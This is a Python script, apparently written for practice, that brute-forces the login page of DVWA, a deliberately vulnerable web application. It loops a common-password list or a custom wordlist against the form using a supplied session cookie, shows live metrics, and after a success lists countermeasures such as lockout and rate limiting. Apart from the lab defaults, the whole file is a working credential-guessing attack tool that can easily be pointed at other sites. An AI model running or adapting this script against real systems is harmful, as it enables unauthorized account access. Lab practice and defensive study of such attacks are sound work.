import requests
import time
import sys
from datetime import datetime
from colorama import Fore, Style, init

# Initialize colorama for colored output
init(autoreset=True)

class BruteForceAttack:
    def __init__(self, target_url, username, session_cookie, security_level):
        self.target_url = target_url
        self.username = username
        self.session_cookie = session_cookie
        self.security_level = security_level
        
        # Statistics
        self.total_attempts = 0
        self.failed_attempts = 0
        self.successful_password = None
        self.start_time = None
        self.end_time = None
        
        # Session setup
        self.session = requests.Session()
        self.cookies = {
            'PHPSESSID': session_cookie,
            'security': security_level
        }
    
    def print_banner(self):
        banner = f"""
{Fore.CYAN}╔════════════════════════════════════════════════════════════╗
║                                                            ║
║           DVWA PASSWORD BRUTE FORCE ATTACK TOOL            ║
║                 I am an ethical hacker                     ║
║                                                            ║
╚════════════════════════════════════════════════════════════╝{Style.RESET_ALL}

{Fore.YELLOW}[*] Target URL      : {Fore.WHITE}{self.target_url}
{Fore.YELLOW}[*] Target Username : {Fore.WHITE}{self.username}
{Fore.YELLOW}[*] Security Level  : {Fore.WHITE}{self.security_level.upper()}
{Fore.YELLOW}[*] Attack Started  : {Fore.WHITE}{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
{Fore.CYAN}{'═' * 60}{Style.RESET_ALL}
"""
        print(banner)
    
    def print_metrics(self, current_password):
        """Print real-time attack metrics"""
        elapsed_time = time.time() - self.start_time
        speed = self.total_attempts / elapsed_time if elapsed_time > 0 else 0
        
        # Clear previous line (for updating metrics in place)
        sys.stdout.write('\r' + ' ' * 100 + '\r')
        
        metrics = (
            f"{Fore.CYAN}[METRICS]{Style.RESET_ALL} "
            f"{Fore.YELLOW}Attempts: {Fore.WHITE}{self.total_attempts:>4} {Fore.YELLOW}| "
            f"Failed: {Fore.RED}{self.failed_attempts:>4} {Fore.YELLOW}| "
            f"Speed: {Fore.GREEN}{speed:.2f} req/s {Fore.YELLOW}| "
            f"Time: {Fore.WHITE}{elapsed_time:.2f}s {Fore.YELLOW}| "
            f"Testing: {Fore.MAGENTA}{current_password:<15}"
        )
        
        sys.stdout.write(metrics)
        sys.stdout.flush()
    
    def test_password(self, password):
        """Test a single password"""
        self.total_attempts += 1
        
        # Displaying current metrics
        self.print_metrics(password)
        
        # Making the request
        params = {
            'username': self.username,
            'password': password,
            'Login': 'Login'
        }
        
        try:
            response = self.session.get(
                self.target_url, 
                params=params, 
                cookies=self.cookies,
                timeout=5
            )
            
            # Check if login was successful
            if "Welcome to the password protected area" in response.text:
                return True
            else:
                self.failed_attempts += 1
                return False
                
        except requests.exceptions.RequestException as e:
            print(f"\n{Fore.RED}[ERROR] Request failed: {e}{Style.RESET_ALL}")
            self.failed_attempts += 1
            return False
    
    def run_attack(self, password_list):
        """Execute the brute force attack"""
        self.print_banner()
        self.start_time = time.time()
        
        print(f"{Fore.CYAN}[*] Loading password list...{Style.RESET_ALL}")
        print(f"{Fore.GREEN}[✓] Loaded {len(password_list)} passwords{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Starting brute force attack...{Style.RESET_ALL}\n")
        
        time.sleep(1)
        
        for password in password_list:
            if self.test_password(password):
                self.successful_password = password
                self.end_time = time.time()
                self.print_success()
                return True
        
        self.end_time = time.time()
        self.print_failure()
        return False
    
    def print_success(self):
        """Print success message with statistics"""
        elapsed = self.end_time - self.start_time
        speed = self.total_attempts / elapsed if elapsed > 0 else 0
        
        success_msg = f"""

{Fore.GREEN}{'═' * 60}
║                    PASSWORD CRACKED!                      ║
{'═' * 60}{Style.RESET_ALL}

{Fore.YELLOW}[+] Credentials Found:{Style.RESET_ALL}
    {Fore.WHITE}Username: {Fore.GREEN}{self.username}
    {Fore.WHITE}Password: {Fore.GREEN}{self.successful_password}

{Fore.CYAN}{'─' * 60}{Style.RESET_ALL}
{Fore.YELLOW}[*] Attack Statistics:{Style.RESET_ALL}
    {Fore.WHITE}Total Attempts    : {Fore.CYAN}{self.total_attempts}
    {Fore.WHITE}Failed Attempts   : {Fore.RED}{self.failed_attempts}
    {Fore.WHITE}Success Rate      : {Fore.GREEN}{((1 - self.failed_attempts/self.total_attempts) * 100):.2f}%
    {Fore.WHITE}Average Speed     : {Fore.CYAN}{speed:.2f} requests/second
    {Fore.WHITE}Time Elapsed      : {Fore.CYAN}{elapsed:.2f} seconds
    {Fore.WHITE}Attack Completed  : {Fore.WHITE}{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
{Fore.CYAN}{'─' * 60}{Style.RESET_ALL}

{Fore.YELLOW}[!] COUNTERMEASURES TO PREVENT THIS ATTACK:{Style.RESET_ALL}
    {Fore.WHITE}1. Account Lockout Policy (3-5 failed attempts)
    2. Progressive Delays Between Login Attempts
    3. CAPTCHA After Failed Attempts
    4. Rate Limiting per IP Address
    5. Multi-Factor Authentication (MFA)
    6. Strong Password Policy Enforcement
    7. Login Attempt Monitoring & Alerts
    8. IP Blacklisting for Suspicious Activity

{Fore.GREEN}{'═' * 60}{Style.RESET_ALL}
"""
        print(success_msg)
    
    def print_failure(self):
        """Print failure message"""
        elapsed = self.end_time - self.start_time
        speed = self.total_attempts / elapsed if elapsed > 0 else 0
        
        failure_msg = f"""

{Fore.RED}{'═' * 60}
║              PASSWORD NOT FOUND IN WORDLIST               ║
{'═' * 60}{Style.RESET_ALL}

{Fore.YELLOW}[*] Attack Statistics:{Style.RESET_ALL}
    {Fore.WHITE}Total Attempts    : {Fore.CYAN}{self.total_attempts}
    {Fore.WHITE}Failed Attempts   : {Fore.RED}{self.failed_attempts}
    {Fore.WHITE}Average Speed     : {Fore.CYAN}{speed:.2f} requests/second
    {Fore.WHITE}Time Elapsed      : {Fore.CYAN}{elapsed:.2f} seconds

{Fore.YELLOW}[!] Suggestions:{Style.RESET_ALL}
    {Fore.WHITE}• Try a larger password list (rockyou.txt - 14M passwords)
    • Verify target URL is correct
    • Check if session cookie is still valid
    • Ensure DVWA security level is set correctly

{Fore.RED}{'═' * 60}{Style.RESET_ALL}
"""
        print(failure_msg)


def load_password_file(filepath):
    """Load passwords from a file"""
    try:
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            passwords = [line.strip() for line in f if line.strip()]
        return passwords
    except FileNotFoundError:
        print(f"{Fore.RED}[ERROR] Password file not found: {filepath}{Style.RESET_ALL}")
        sys.exit(1)


def get_default_passwords():
    """Return a default password list"""
    return [
        "password", "123456", "12345678", "qwerty", "abc123",
        "monkey", "1234567", "letmein", "trustno1", "dragon",
        "baseball", "111111", "iloveyou", "master", "sunshine",
        "ashley", "bailey", "passw0rd", "shadow", "123123",
        "654321", "superman", "qazwsx", "michael", "football",
        "admin", "welcome", "pass", "login", "changeme"
    ]


def main():
    print(f"{Fore.CYAN}{'═' * 60}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}   DVWA Brute Force Attack Tool - Configuration{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'═' * 60}{Style.RESET_ALL}\n")
    
    # Get configuration from user
    target_url = input(f"{Fore.YELLOW}[?] Enter DVWA Brute Force URL{Style.RESET_ALL}\n    {Fore.WHITE}(default: http://localhost/DVWA/DVWA/vulnerabilities/brute/): {Style.RESET_ALL}").strip()
    if not target_url:
        target_url = "http://localhost/DVWA/DVWA/vulnerabilities/brute/"
    
    username = input(f"\n{Fore.YELLOW}[?] Enter target username{Style.RESET_ALL}\n    {Fore.WHITE}(default: admin): {Style.RESET_ALL}").strip()
    if not username:
        username = "admin"
    
    print(f"\n{Fore.YELLOW}[!] You need to get your PHPSESSID cookie from the browser:{Style.RESET_ALL}")
    print(f"    {Fore.WHITE}1. Open DVWA in browser and login")
    print(f"    2. Press F12 → Application → Cookies → localhost")
    print(f"    3. Copy the PHPSESSID value{Style.RESET_ALL}")
    session_cookie = input(f"\n{Fore.YELLOW}[?] Enter PHPSESSID cookie: {Style.RESET_ALL}").strip()
    
    if not session_cookie:
        print(f"{Fore.RED}[ERROR] Session cookie is required!{Style.RESET_ALL}")
        sys.exit(1)
    
    security_level = input(f"\n{Fore.YELLOW}[?] Enter security level{Style.RESET_ALL}\n    {Fore.WHITE}(low/medium/high, default: medium): {Style.RESET_ALL}").strip().lower()
    if not security_level:
        security_level = "medium"
    
    # Ask about password list
    use_file = input(f"\n{Fore.YELLOW}[?] Use custom password file?{Style.RESET_ALL}\n    {Fore.WHITE}(y/n, default: n): {Style.RESET_ALL}").strip().lower()
    
    if use_file == 'y':
        filepath = input(f"{Fore.YELLOW}[?] Enter password file path: {Style.RESET_ALL}").strip()
        passwords = load_password_file(filepath)
    else:
        print(f"{Fore.CYAN}[*] Using default password list (30 common passwords){Style.RESET_ALL}")
        passwords = get_default_passwords()
    
    print(f"\n{Fore.GREEN}[✓] Configuration complete!{Style.RESET_ALL}")
    input(f"{Fore.YELLOW}[*] Press ENTER to start the attack...{Style.RESET_ALL}")
    
    # Create and run the attack
    attacker = BruteForceAttack(target_url, username, session_cookie, security_level)
    attacker.run_attack(passwords)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{Fore.RED}[!] Attack interrupted by user{Style.RESET_ALL}")
        sys.exit(0)
    except Exception as e:
        print(f"\n\n{Fore.RED}[ERROR] {e}{Style.RESET_ALL}")
        sys.exit(1)